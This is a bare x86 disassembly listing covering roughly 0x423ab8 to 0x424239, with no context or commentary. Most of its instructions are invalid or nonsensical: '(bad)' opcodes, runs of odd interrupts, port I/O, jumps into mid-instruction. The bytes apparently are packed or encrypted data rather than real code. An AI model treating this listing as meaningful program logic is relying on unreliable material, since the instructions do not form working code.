  423ab8:	(bad)  
  423ab9:	add    BYTE PTR gs:[eax+0x1c],dh
  423abd:	int    0x76
  423abf:	rcl    bl,1
  423ac1:	ins    DWORD PTR es:[edi],dx
  423ac2:	xchg   edx,eax
  423ac3:	cmp    ecx,ecx
  423ac5:	inc    ebx
  423ac6:	leave  
  423ac7:	int    0x76
  423ac9:	mov    ch,cl
  423acb:	lea    ebp,ds:0x811101cd
  423ad1:	add    BYTE PTR [eax-0x29d26933],0x54
  423ad8:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423adb:	cdq    
  423adc:	shr    ebx,cl
  423ade:	xchg   edx,eax
  423adf:	shr    edx,cl
  423ae1:	sub    BYTE PTR [ebx+0x13],dl
  423ae4:	jno    0x423ab3
  423ae6:	lea    esi,[ebp+0x3bb596cd]
  423aec:	or     al,0x3b
  423aee:	cdq    
  423aef:	shr    ebx,cl
  423af1:	xchg   edx,eax
  423af2:	shr    edx,cl
  423af4:	sub    BYTE PTR [ebx+0x13],dl
  423af7:	jno    0x423af9
  423af9:	(bad)  
  423afa:	jne    0x423afc
  423afc:	jo     0x423b1a
  423afe:	int    0x76
  423b00:	lods   eax,DWORD PTR ds:[esi]
  423b01:	or     dh,BYTE PTR [esi+0x75]
  423b04:	int    0x76
  423b06:	cmp    eax,0xecfd760a
  423b0b:	cmp    BYTE PTR [ebx],bh
  423b0d:	or     al,0x3b
  423b0f:	cdq    
  423b10:	shr    ebx,cl
  423b12:	xchg   edx,eax
  423b13:	shr    edx,cl
  423b15:	sub    BYTE PTR [ebx+0x13],dl
  423b18:	jno    0x423ae7
  423b1a:	lea    esi,[ebp+0x3bb596cd]
  423b20:	or     al,0x3b
  423b22:	cdq    
  423b23:	shr    ebx,cl
  423b25:	xchg   edx,eax
  423b26:	shr    edx,cl
  423b28:	sub    BYTE PTR [ebx+0x13],dl
  423b2b:	jno    0x423b2d
  423b2d:	(bad)  
  423b2e:	lods   eax,DWORD PTR ds:[esi]
  423b2f:	add    BYTE PTR [eax+0x1c],dh
  423b32:	int    0x76
  423b34:	std    
  423b35:	or     dh,BYTE PTR [esi+0x1d]
  423b38:	int    0x76
  423b3a:	jne    0x423b46
  423b3c:	out    0x55,al
  423b3e:	or     dh,BYTE PTR [esi-0x30]
  423b41:	leave  
  423b42:	jbe    0x423ae1
  423b44:	inc    ecx
  423b45:	and    DWORD PTR [esi+0x5576cd35],eax
  423b4b:	int    0x8d
  423b4d:	push   ebp
  423b4e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b51:	or     al,0xd3
  423b53:	lods   eax,DWORD PTR ds:[esi]
  423b54:	sub    bl,dl
  423b56:	jmp    0x423aea
  423b58:	push   ebx
  423b59:	ror    DWORD PTR [edx],cl
  423b5b:	jbe    0x423ba2
  423b5d:	int    0x76
  423b5f:	push   ebp
  423b60:	int    0x8d
  423b62:	push   ebp
  423b63:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b66:	or     al,0xd3
  423b68:	lods   eax,DWORD PTR ds:[esi]
  423b69:	sub    bl,dl
  423b6b:	jmp    0x423aff
  423b6d:	push   ebx
  423b6e:	ror    DWORD PTR [edx],cl
  423b70:	jbe    0x423b7f
  423b72:	leave  
  423b73:	jbe    0x423b0a
  423b75:	dec    eax
  423b76:	and    DWORD PTR [esi-0x528936cb],eax
  423b7c:	ret    0x8621
  423b7f:	xor    eax,0xcd5576cd
  423b84:	lea    edx,[ebp+0x3b]
  423b87:	jns    0x423bc4
  423b89:	or     al,0xd3
  423b8b:	jmp    0x423b1f
  423b8d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423b93:	lea    ebx,ds:0x52f7d43
  423b99:	push   ss
  423b9a:	xchg   DWORD PTR [eax-0x6d241480],eax
  423ba0:	add    BYTE PTR [eax-0x326a7233],0x76
  423ba7:	xchg   ebp,eax
  423ba8:	int    0x96
  423baa:	inc    ebp
  423bab:	cmp    eax,ebp
  423bad:	cmp    ecx,DWORD PTR [edi]
  423baf:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423bb5:	push   ebx
  423bb6:	jge    0x423b85
  423bb8:	jbe    0x423bd7
  423bba:	xor    edx,edx
  423bbc:	cmp    ebx,edx
  423bbe:	clc    
  423bbf:	add    cl,BYTE PTR [edx]
  423bc1:	jbe    0x423bd0
  423bc3:	int    0x76
  423bc5:	lods   eax,DWORD PTR ds:[esi]
  423bc6:	int    0x8d
  423bc8:	lods   eax,DWORD PTR ds:[esi]
  423bc9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bcc:	or     al,0xd3
  423bce:	jmp    0x423b62
  423bd0:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bd6:	lea    ecx,ds:0x16d87d43
  423bdc:	int    0x76
  423bde:	lods   eax,DWORD PTR ds:[esi]
  423bdf:	int    0x8d
  423be1:	lods   eax,DWORD PTR ds:[esi]
  423be2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423be5:	or     al,0xd3
  423be7:	lods   eax,DWORD PTR ds:[esi]
  423be8:	sub    bl,dl
  423bea:	jmp    0x423b7e
  423bec:	push   ebx
  423bed:	ror    DWORD PTR [edx],cl
  423bef:	jbe    0x423bfe
  423bf1:	int    0x76
  423bf3:	xchg   ebp,eax
  423bf4:	int    0x8d
  423bf6:	xchg   ebp,eax
  423bf7:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bfa:	or     al,0xd3
  423bfc:	lods   eax,DWORD PTR ds:[esi]
  423bfd:	sub    bl,dl
  423bff:	jmp    0x423b93
  423c01:	push   ebx
  423c02:	ror    ebp,cl
  423c04:	lea    ecx,ds:0xad3d12f
  423c0a:	jbe    0x423c19
  423c0c:	int    0x76
  423c0e:	push   ebp
  423c0f:	int    0x8d
  423c11:	push   ebp
  423c12:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c15:	or     al,0xd3
  423c17:	jmp    0x423bab
  423c19:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c1f:	lea    ecx,ds:0x52f7d43
  423c25:	pusha  
  423c26:	xchg   edx,eax
  423c27:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c2e:	or     eax,0x874576cd
  423c33:	jbe    0x423c05
  423c35:	or     ah,dh
  423c37:	cmp    eax,0x5d5d760a
  423c3c:	inc    ecx
  423c3d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c43:	leave  
  423c44:	jbe    0x423cab
  423c46:	cmp    DWORD PTR [ecx],esp
  423c48:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c4e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423c54:	int    0x76
  423c56:	cmp    eax,0x3b3d8dcd
  423c5b:	jns    0x423c98
  423c5d:	or     al,0xd3
  423c5f:	lods   eax,DWORD PTR ds:[esi]
  423c60:	sub    bl,dl
  423c62:	jmp    0x423bf6
  423c64:	push   ebx
  423c65:	ror    DWORD PTR [edx],cl
  423c67:	jbe    0x423ce6
  423c69:	int    0x6d
  423c6b:	jmp    0x423c73
  423c6d:	add    DWORD PTR [eax-0x36923280],0x8c06
  423c77:	add    BYTE PTR [ebx],cl
  423c79:	and    DWORD PTR [esi-0x369232cb],eax
  423c7f:	push   es
  423c80:	jl     0x423c82
  423c82:	add    BYTE PTR [eax],al
  423c84:	mul    DWORD PTR [ecx]
  423c86:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423c8c:	int    0x76
  423c8e:	icebp  
  423c8f:	int    0x8d
  423c91:	icebp  
  423c92:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c95:	or     al,0xd3
  423c97:	lods   eax,DWORD PTR ds:[esi]
  423c98:	sub    bl,dl
  423c9a:	jmp    0x423c2e
  423c9c:	push   ebx
  423c9d:	ror    ebp,cl
  423c9f:	lea    edi,[ebp+0x2f]
  423ca2:	rcl    ebx,1
  423ca4:	int    0x8d
  423ca6:	pop    ebp
  423ca7:	retf   0x8884
  423caa:	or     DWORD PTR [esi-0x1f],esi
  423cad:	int    0x6d
  423caf:	int    0x76
  423cb1:	icebp  
  423cb2:	int    0x8d
  423cb4:	icebp  
  423cb5:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423cb8:	jns    0x423c8d
  423cba:	jmp    0x423c4e
  423cbc:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423cc2:	lea    edi,[ebp+0x2f]
  423cc5:	rcl    ebx,1
  423cc7:	int    0x8d
  423cc9:	gs int 0x96
  423ccc:	cmp    ecx,DWORD PTR gs:[edi]
  423ccf:	cmp    edx,ebp
  423cd1:	shl    edx,cl
  423cd3:	sub    bl,dl
  423cd5:	repz xchg edx,eax
  423cd7:	push   ebx
  423cd8:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423cde:	das    
  423cdf:	pop    ecx
  423ce0:	dec    esp
  423ce1:	mov    ch,cl
  423ce3:	push   es
  423ce4:	mov    WORD PTR [eax],es
  423ce6:	add    BYTE PTR [eax],al
  423ce8:	int    0x17
  423cea:	mov    WORD PTR [eax],es
  423cec:	add    BYTE PTR [eax],al
  423cee:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cf1:	aad    0xd3
  423cf3:	lods   eax,DWORD PTR ds:[esi]
  423cf4:	sub    bl,dl
  423cf6:	repz xchg edx,eax
  423cf8:	push   ebx
  423cf9:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423cff:	loope  0x423d3c
  423d01:	jge    0x423d0c
  423d03:	(bad)  
  423d04:	loope  0x423cd3
  423d06:	ins    DWORD PTR es:[edi],dx
  423d07:	retf   0xe176
  423d0a:	int    0x8d
  423d0c:	icebp  
  423d0d:	int    0x96
  423d0f:	icebp  
  423d10:	cmp    ecx,DWORD PTR [edi]
  423d12:	cmp    edx,ebp
  423d14:	shl    ebx,cl
  423d16:	xchg   edx,eax
  423d17:	shl    edx,cl
  423d19:	sub    BYTE PTR [ebx+0x13],dl
  423d1c:	int    0x96
  423d1e:	jge    0x423d4f
  423d20:	rcl    DWORD PTR [ebx],1
  423d22:	int    0x96
  423d24:	pop    ebp
  423d25:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d2c:	icebp  
  423d2d:	int    0x8d
  423d2f:	icebp  
  423d30:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d33:	or     al,0xd3
  423d35:	lods   eax,DWORD PTR ds:[esi]
  423d36:	sub    bl,dl
  423d38:	jmp    0x423ccc
  423d3a:	push   ebx
  423d3b:	ror    ebp,cl
  423d3d:	lea    edi,[ebp+0x2f]
  423d40:	rcl    ebx,1
  423d42:	int    0x8d
  423d44:	pop    ebp
  423d45:	retf   0x8884
  423d48:	or     DWORD PTR [esi-0x1f],esi
  423d4b:	int    0x6d
  423d4d:	int    0x76
  423d4f:	icebp  
  423d50:	int    0x8d
  423d52:	icebp  
  423d53:	cmp    edi,DWORD PTR [ecx-0x2d]
  423d56:	lods   eax,DWORD PTR ds:[esi]
  423d57:	sub    BYTE PTR [ebx],bh
  423d59:	or     al,0xd3
  423d5b:	jmp    0x423cef
  423d5d:	push   ebx
  423d5e:	ror    ebp,cl
  423d60:	lea    edi,[ebp+0x2f]
  423d63:	rcl    ebx,1
  423d65:	int    0x8d
  423d67:	ins    DWORD PTR es:[edi],dx
  423d68:	int    0x96
  423d6a:	ins    DWORD PTR es:[edi],dx
  423d6b:	cmp    ecx,DWORD PTR [edi]
  423d6d:	cmp    edx,ebp
  423d6f:	shl    edx,cl
  423d71:	sub    bl,dl
  423d73:	repz xchg edx,eax
  423d75:	push   ebx
  423d76:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d7c:	das    
  423d7d:	pop    ecx
  423d7e:	dec    esp
  423d7f:	mov    ch,cl
  423d81:	push   es
  423d82:	jl     0x423d84
  423d84:	add    BYTE PTR [eax],al
  423d86:	int    0x17
  423d88:	jl     0x423d8a
  423d8a:	add    BYTE PTR [eax],al
  423d8c:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d8f:	aad    0xd3
  423d91:	lods   eax,DWORD PTR ds:[esi]
  423d92:	sub    bl,dl
  423d94:	repz xchg edx,eax
  423d96:	push   ebx
  423d97:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d9d:	loope  0x423dda
  423d9f:	jge    0x423daa
  423da1:	(bad)  
  423da2:	loope  0x423d71
  423da4:	ins    DWORD PTR es:[edi],dx
  423da5:	retf   0xe176
  423da8:	int    0x8d
  423daa:	icebp  
  423dab:	int    0x96
  423dad:	icebp  
  423dae:	cmp    ecx,DWORD PTR [edi]
  423db0:	cmp    edx,ebp
  423db2:	shl    ebx,cl
  423db4:	xchg   edx,eax
  423db5:	shl    edx,cl
  423db7:	sub    BYTE PTR [ebx+0x13],dl
  423dba:	int    0x96
  423dbc:	jge    0x423ded
  423dbe:	rcl    DWORD PTR [ebx],1
  423dc0:	int    0x96
  423dc2:	pop    ebp
  423dc3:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dca:	and    eax,0x3b258dcd
  423dcf:	or     al,0x3b
  423dd1:	jns    0x423da6
  423dd3:	jmp    0x423d67
  423dd5:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423ddb:	lea    ebp,[ebp-0x33]
  423dde:	xchg   esi,eax
  423ddf:	ins    DWORD PTR es:[edi],dx
  423de0:	cmp    ecx,DWORD PTR [edi]
  423de2:	cmp    edx,ebp
  423de4:	shl    edx,cl
  423de6:	sub    bl,dl
  423de8:	repz xchg edx,eax
  423dea:	push   ebx
  423deb:	adc    ebp,DWORD PTR [edi]
  423ded:	rcl    ebx,1
  423def:	xchg   DWORD PTR [esi+0x7d],esi
  423df2:	or     dh,BYTE PTR [esi+0x7d]
  423df5:	int    0x76
  423df7:	jge    0x423dc6
  423df9:	lea    ecx,ds:0xb2f7d43
  423dff:	(bad)  
  423e00:	inc    DWORD PTR [eax]
  423e02:	add    ch,cl
  423e04:	jbe    0x423e73
  423e06:	int    0x8d
  423e08:	ins    DWORD PTR es:[edi],dx
  423e09:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e0c:	jmp    0x423da0
  423e0e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e11:	lods   eax,DWORD PTR ds:[esi]
  423e12:	sub    BYTE PTR [ebx-0x2d],dl
  423e15:	int    0x8d
  423e17:	or     eax,0xcdd3d12f
  423e1c:	lea    edi,ds:0xf2d30f3b
  423e22:	sub    BYTE PTR [ebx-0x2d],dl
  423e25:	int    0x8d
  423e27:	cmp    eax,0xebd30c3b
  423e2c:	xchg   edx,eax
  423e2d:	push   ebx
  423e2e:	ror    DWORD PTR [edx],cl
  423e30:	jbe    0x423e97
  423e32:	int    0x76
  423e34:	popf   
  423e35:	int    0x8d
  423e37:	popf   
  423e38:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e3b:	jmp    0x423dcf
  423e3d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e40:	lods   eax,DWORD PTR ds:[esi]
  423e41:	sub    BYTE PTR [ebx-0x2d],dl
  423e44:	int    0x8d
  423e46:	popf   
  423e47:	int    0x96
  423e49:	popf   
  423e4a:	cmp    ecx,DWORD PTR [edi]
  423e4c:	shl    edx,cl
  423e4e:	sub    BYTE PTR [ebx],bh
  423e50:	aad    0xd3
  423e52:	repz xchg edx,eax
  423e54:	push   ebx
  423e55:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423e5b:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423e61:	in     al,dx
  423e62:	sbb    al,0xcd
  423e64:	jbe    0x423e03
  423e66:	int    0x8d
  423e68:	popf   
  423e69:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e6c:	or     al,0xd3
  423e6e:	lods   eax,DWORD PTR ds:[esi]
  423e6f:	sub    bl,dl
  423e71:	jmp    0x423e05
  423e73:	push   ebx
  423e74:	rol    DWORD PTR [edi+0x760a4576],cl
  423e7a:	inc    ebp
  423e7b:	int    0x76
  423e7d:	popf   
  423e7e:	int    0x8d
  423e80:	popf   
  423e81:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e84:	lods   eax,DWORD PTR ds:[esi]
  423e85:	sub    BYTE PTR [ebx],bh
  423e87:	or     al,0xd3
  423e89:	jmp    0x423e1d
  423e8b:	push   ebx
  423e8c:	ror    ebp,cl
  423e8e:	lea    ebx,ds:0x76cd7d33
  423e94:	popf   
  423e95:	int    0x96
  423e97:	popf   
  423e98:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e9b:	aad    0xd3
  423e9d:	repz xchg edx,eax
  423e9f:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ea5:	xchg   esi,eax
  423ea6:	inc    ebp
  423ea7:	das    
  423ea8:	rcl    edx,1
  423eaa:	inc    ebx
  423eab:	shr    DWORD PTR [edi],cl
  423ead:	pop    es
  423eae:	adc    ebp,edi
  423eb0:	add    BYTE PTR [eax],al
  423eb2:	int    0x76
  423eb4:	mov    BYTE PTR [eax],al
  423eb6:	(bad)  
  423eb7:	dec    esp
  423eb8:	iret   
  423eb9:	jbe    0x423e78
  423ebb:	add    dh,dl
  423ebd:	mov    BYTE PTR [eax-0x33],dh
  423ec0:	jbe    0x423e4a
  423ec2:	int    0x1
  423ec4:	xchg   ebp,eax
  423ec5:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423ecf:	icebp  
  423ed0:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423eda:	jne    0x423e99
  423edc:	test   al,0x88
  423ede:	add    BYTE PTR [eax-0x322f89f6],0x76
  423ee5:	stc    
  423ee6:	int    0x8d
  423ee8:	stc    
  423ee9:	cmp    eax,ebp
  423eeb:	cmp    ecx,DWORD PTR [edi]
  423eed:	shl    edx,cl
  423eef:	sub    bl,dl
  423ef1:	mov    ebp,0xcdd35392
  423ef6:	lea    esi,[ebp+0x43]
  423ef9:	rcl    esp,cl
  423efb:	push   esi
  423efc:	int    0x76
  423efe:	mov    ch,cl
  423f00:	lea    ebp,ds:0xcd2d96cd
  423f06:	add    DWORD PTR [ecx],edx
  423f08:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f12:	shr    edx,cl
  423f14:	sub    BYTE PTR [ebx+0x13],dl
  423f17:	jno    0x423ee6
  423f19:	(bad)  
  423f1a:	stc    
  423f1b:	int    0x96
  423f1d:	stc    
  423f1e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f21:	cdq    
  423f22:	shr    ebx,cl
  423f24:	xchg   edx,eax
  423f25:	shr    edx,cl
  423f27:	sub    BYTE PTR [ebx+0x13],dl
  423f2a:	jno    0x423f2c
  423f2c:	(bad)  
  423f2d:	jne    0x423f2f
  423f2f:	jo     0x423f4d
  423f31:	stos   BYTE PTR es:[edi],al
  423f32:	test   al,0x63
  423f34:	retf   
  423f35:	ror    BYTE PTR [eax-0x12326980],cl
  423f3b:	add    al,0xed
  423f3d:	and    al,0x98
  423f3f:	int    0x11
  423f41:	int    0x12
  423f43:	sub    eax,0x4808081
  423f48:	pop    esp
  423f49:	sub    BYTE PTR [edi],0x5
  423f4c:	dec    edx
  423f4d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423f57:	add    BYTE PTR [esi],0xf7
  423f5a:	das    
  423f5b:	add    eax,0x80808003
  423f60:	int    0x7
  423f62:	or     DWORD PTR [eax+0x6d068080],eax
  423f68:	das    
  423f69:	add    eax,0x808080e9
  423f6e:	add    al,0x69
  423f70:	int3   
  423f71:	add    BYTE PTR [eax+0x52f3080],0xe2
  423f78:	add    BYTE PTR [eax+0x54985e80],0x2f
  423f7f:	add    eax,0x808080e3
  423f84:	int    0xc1
  423f86:	and    eax,0x4808081
  423f8b:	mov    dh,0x11
  423f8d:	or     ch,0x13
  423f90:	xor    ecx,DWORD PTR [esi-0x79]
  423f93:	shr    BYTE PTR [edi],cl
  423f95:	mov    ebx,0x8d0a4c70
  423f9a:	mov    ch,0x2f
  423f9c:	mov    ebx,0x13874e7c
  423fa1:	das    
  423fa2:	add    eax,0x80808049
  423fa7:	iret   
  423fa8:	jl     0x423fbe
  423faa:	pop    ebx
  423fab:	or     cl,BYTE PTR [ebp+0x69bd]
  423fb1:	add    BYTE PTR [ebx-0x2baef966],al
  423fb7:	or     ebp,0x31
  423fba:	add    al,0xb6
  423fbc:	cmc    
  423fbd:	sub    BYTE PTR [ebx],0x99
  423fc0:	xchg   ecx,esi
  423fc2:	das    
  423fc3:	mov    ebx,0xbb2f4ee0
  423fc8:	mov    al,ds:0xd4fc874c
  423fcd:	mov    esi,0xa148acf
  423fd2:	(bad)  
  423fd3:	in     eax,dx
  423fd4:	push   es
  423fd5:	push   ecx
  423fd6:	aam    0x6e
  423fd8:	int    0x89
  423fda:	add    al,0xb6
  423fdc:	stc    
  423fdd:	sub    BYTE PTR [ebx],0xf
  423fe0:	xchg   DWORD PTR [ebp+0x2f],edi
  423fe3:	mov    ebx,0xbb2f4ede
  423fe8:	sahf   
  423fe9:	dec    esp
  423fea:	xchg   esp,edi
  423fec:	aam    0x33
  423fee:	iret   
  423fef:	ficom  WORD PTR [edx+ecx*1]
  423ff2:	out    0xfd,al
  423ff4:	int    0xe6
  423ff6:	std    
  423ff7:	int    0x6a
  423ff9:	push   es
  423ffa:	add    ah,dl
  423ffc:	xchg   ch,cl
  423ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fff:	mov    ch,0x81
  424001:	and    al,0x8b
  424003:	das    
  424004:	mov    ebx,0xbb2f4ede
  424009:	sahf   
  42400a:	dec    esp
  42400b:	add    BYTE PTR [esi-0x7],dh
  42400e:	add    al,0x76
  424010:	std    
  424011:	mov    BYTE PTR [edi-0x619a104],al
  424017:	sbb    ch,0x2f
  42401a:	mov    ebx,0xbb2f4ee0
  42401f:	mov    al,ds:0xed8dcd4c
  424024:	add    BYTE PTR [esi-0xb],dh
  424027:	add    al,0xd3
  424029:	mov    BYTE PTR [edi-0x1272f504],al
  42402f:	pop    esi
  424030:	out    0xf5,al
  424032:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424039:	jo     0x424089
  42403b:	das    
  42403c:	mov    ebx,0x76004cdc
  424041:	adc    DWORD PTR [ebx+edx*8],eax
  424044:	mov    BYTE PTR [edi-0x4272f527],al
  42404a:	pop    esi
  42404b:	xchg   esi,eax
  42404c:	adc    DWORD PTR [edi],ebp
  42404e:	or     ebp,DWORD PTR [esi-0x56000000]
  424054:	arpl   WORD PTR [ebx],di
  424056:	ins    DWORD PTR es:[edi],dx
  424057:	ins    BYTE PTR es:[edi],dx
  424058:	in     al,dx
  424059:	xchg   edx,eax
  42405a:	cmp    ebp,DWORD PTR [ebp-0x58]
  42405d:	retf   
  42405e:	lds    edx,FWORD PTR [esi+0xacdedcd]
  424064:	sub    eax,0xcd808081
  424069:	jbe    0x4240b7
  42406b:	add    al,0xed
  42406d:	xor    BYTE PTR [ebx+0x3b],bl
  424070:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  424076:	add    eax,0x8080800b
  42407b:	inc    ebx
  42407c:	(bad)
  42407f:	pop    esi
  424080:	pushf  
  424081:	(bad)  
  424083:	test   DWORD PTR [ebx],edi
  424085:	ins    DWORD PTR es:[edi],dx
  424086:	ins    BYTE PTR es:[edi],dx
  424087:	in     al,dx
  424088:	fmul   st,st(5)
  42408a:	ins    BYTE PTR es:[edi],dx
  42408b:	fadd   QWORD PTR [edi+0x7ccd8876]
  424091:	and    al,0xcd
  424093:	jo     0x4240c9
  424095:	int    0x90
  424097:	adc    al,0xcd
  424099:	fcomp  QWORD PTR [edi+eax*4]
  42409c:	lea    ecx,[eax+0xa889687]
  4240a2:	(bad)  
  4240a3:	std    
  4240a4:	inc    ebx
  4240a5:	clc    
  4240a6:	jnp    0x42402f
  4240a8:	or     ah,dh
  4240aa:	std    
  4240ab:	or     ah,BYTE PTR [esi-0x259a107]
  4240b1:	fsub   st,st(3)
  4240b3:	inc    ebx
  4240b4:	pushf  
  4240b5:	adc    al,0x77
  4240b7:	xchg   BYTE PTR [edi],ch
  4240b9:	mov    ebx,0x92eca054
  4240be:	int    0xf4
  4240c0:	iret   
  4240c1:	push   esp
  4240c2:	ror    ebp,0x68
  4240c5:	push   es
  4240c6:	add    ah,dl
  4240c8:	ds xchg esi,esp
  4240cb:	mov    BYTE PTR [edx],cl
  4240cd:	out    0x11,al
  4240cf:	inc    ebx
  4240d0:	stc    
  4240d1:	fdiv   DWORD PTR [eax]
  4240d3:	int    0xa6
  4240d5:	dec    esp
  4240d6:	int    0x63
  4240d8:	in     al,0x87
  4240da:	popf   
  4240db:	inc    ebx
  4240dc:	cld    
  4240dd:	ja     0x424063
  4240df:	int    0x58
  4240e1:	in     al,dx
  4240e2:	mov    BYTE PTR [ebx],dh
  4240e4:	out    0x88,al
  4240e6:	or     ch,BYTE PTR [eax-0x33]
  4240e9:	(bad)  
  4240ea:	adc    DWORD PTR [esi],eax
  4240ec:	not    esp
  4240ee:	dec    esi
  4240ef:	int    0xa6
  4240f1:	stc    
  4240f2:	dec    ebx
  4240f3:	or     ah,BYTE PTR [esi-0x259bc07]
  4240f9:	sbb    BYTE PTR [ebp-0x14],0x8
  4240fd:	cmp    ebp,DWORD PTR [ebp-0x56]
  424100:	test   al,0x63
  424102:	retf   
  424103:	ror    BYTE PTR [eax-0x12326980],cl
  424109:	add    al,0xed
  42410b:	push   eax
  42410c:	pop    ebx
  42410d:	cwde   
  42410e:	pop    ebp
  42410f:	dec    ecx
  424110:	and    DWORD PTR [esi-0x289f5cb],eax
  424116:	leave  
  424117:	jbe    0x424112
  424119:	inc    ecx
  42411a:	and    DWORD PTR [esi-0x27232cb],eax
  424120:	int    0xa6
  424122:	std    
  424123:	call   0x3b81:0x90cfffc0
  42412a:	psrlq  mm5,mm3
  42412d:	xchg   edx,eax
  42412e:	stos   BYTE PTR es:[edi],al
  42412f:	cmp    esp,ecx
  424131:	shl    ebp,cl
  424133:	sub    BYTE PTR [ebx+0xc],dl
  424136:	or     cl,BYTE PTR [ebp-0x2723243]
  42413c:	int    0x8d
  42413e:	std    
  42413f:	int    0x8d
  424141:	std    
  424142:	int    0x8d
  424144:	std    
  424145:	int    0x8d
  424147:	std    
  424148:	int    0x8d
  42414a:	std    
  42414b:	int    0x8d
  42414d:	std    
  42414e:	int    0x8d
  424150:	std    
  424151:	int    0x8d
  424153:	std    
  424154:	int    0x8d
  424156:	std    
  424157:	leave  
  424158:	jbe    0x42416b
  42415a:	fadd   st,st(5)
  42415c:	loope  0x4241b3
  42415e:	int    0x8d
  424160:	std    
  424161:	int    0xa6
  424163:	std    
  424164:	cmp    esp,ecx
  424166:	cmp    ecx,DWORD PTR [edi]
  424168:	shl    ebp,cl
  42416a:	sub    bl,dl
  42416c:	jmp    0x424100
  42416e:	push   ebx
  42416f:	or     al,0xcd
  424171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424172:	dec    esp
  424173:	int    0x9f
  424175:	sub    eax,0x43808081
  42417a:	push   ebx
  42417b:	das    
  42417c:	add    eax,0x80808717
  424181:	int    0x8d
  424183:	std    
  424184:	int    0xa6
  424186:	std    
  424187:	cmp    ecx,DWORD PTR [edi]
  424189:	cmp    esp,ecx
  42418b:	shr    ebx,cl
  42418d:	xchg   edx,eax
  42418e:	shl    ebp,cl
  424190:	sub    BYTE PTR [ebx+0xc],dl
  424193:	inc    ebx
  424194:	adc    ebp,DWORD PTR [edi]
  424196:	add    eax,0x8080877f
  42419b:	int    0xca
  42419d:	add    DWORD PTR [eax-0x69327f80],eax
  4241a3:	std    
  4241a4:	int    0xa6
  4241a6:	std    
  4241a7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241ad:	xchg   edx,eax
  4241ae:	shl    ebp,cl
  4241b0:	sub    BYTE PTR [ebx-0x2b],dl
  4241b3:	inc    ebx
  4241b4:	adc    ebp,DWORD PTR [edi]
  4241b6:	add    eax,0x8080875b
  4241bb:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  4241c1:	int    0xf1
  4241c3:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  4241c9:	shl    ebx,cl
  4241cb:	xchg   edx,eax
  4241cc:	shl    ebp,cl
  4241ce:	sub    BYTE PTR [ebx-0x2b],dl
  4241d1:	or     dl,BYTE PTR [esi+0x1196cd11]
  4241d7:	inc    ebx
  4241d8:	icebp  
  4241d9:	aam    0x26
  4241db:	int    0x76
  4241dd:	std    
  4241de:	int    0x96
  4241e0:	std    
  4241e1:	cmp    ebx,ecx
  4241e3:	cmp    edi,DWORD PTR [ecx-0x2d]
  4241e6:	jmp    0xd253:0x92bdd328
  4241ed:	int    0x96
  4241ef:	adc    DWORD PTR [ebx-0x26],esi
  4241f2:	adc    al,0x5e
  4241f4:	test   BYTE PTR [edx-0x2a],cl
  4241f7:	xor    cl,ch
  4241f9:	jbe    0x4241f8
  4241fb:	int    0x96
  4241fd:	std    
  4241fe:	cmp    ebx,ecx
  424200:	cmp    edi,DWORD PTR [ecx-0x2d]
  424203:	jmp    0xd253:0x92bdd328
  42420a:	int    0x96
  42420c:	adc    DWORD PTR [ebx-0x26],esi
  42420f:	adc    al,0x5e
  424211:	je     0x42425d
  424213:	xor    BYTE PTR [edi],ch
  424215:	add    eax,0x808092df
  42421a:	int    0x76
  42421c:	std    
  42421d:	int    0x76
  42421f:	std    
  424220:	int    0xa6
  424222:	std    
  424223:	int    0x76
  424225:	std    
  424226:	cmp    ecx,ecx
  424228:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42422e:	in     al,dx
  42422f:	xchg   edx,eax
  424230:	push   ebx
  424231:	popf   
  424232:	int    0x76
  424234:	adc    DWORD PTR [ebx+0x6d],esi
  424237:	adc    al,0x87
  424239:	ror    ebp,cl
